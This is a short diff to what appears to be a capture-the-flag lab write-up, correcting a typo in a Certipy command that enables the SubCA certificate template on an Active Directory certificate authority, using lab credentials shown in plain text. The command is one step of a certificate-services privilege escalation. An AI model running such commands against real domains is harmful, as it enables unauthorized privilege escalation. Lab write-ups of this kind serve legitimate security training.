@@ -701,7 +701,7 @@ certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!
 #### Enable the SubCA template:
 
 ```
-ertipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -enable-template SubCA
+certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -enable-template SubCA
 ```
 
 #### Output:
